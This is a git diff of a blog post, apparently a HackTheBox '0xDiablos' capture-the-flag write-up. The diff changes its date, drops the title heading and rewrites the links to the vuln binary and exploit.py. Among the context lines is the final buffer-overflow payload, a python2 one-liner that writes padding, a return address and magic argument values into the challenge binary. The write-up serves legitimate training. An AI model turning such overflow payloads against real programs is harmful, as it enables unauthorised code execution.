@@ -1,15 +1,14 @@
 ---
 title: "0xdiablos"
-date: 2022-09-20T15:33:31+01:00
+date: 2022-09-20T14:03:31+01:00
 draft: false
 categories:
   - HackTheBox
 ---
-# You know who are 0xDiablos
 
 First challenge on this platform!
 
-No nmap scan or gobuster...I just had to download the [vuln](vuln) script in zip archive with a given password (hackthebox)
+No nmap scan or gobuster...I just had to download the [vuln](/htb/oxdiablos/vuln) script in zip archive with a given password (hackthebox)
 
 After unzipping and executing it, the program just takes an input and echo it back in the console...
 
@@ -331,7 +330,7 @@ Now the final paylaod is:
 
 `python2 -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')" | ./vuln`
 
-used an [exploit.py](exploit.py) script for better comfort and usabilty
+used an [exploit.py](/htb/oxdiablos/exploit.py) script for better comfort and usabilty
 
 You can also use netcat directly
 
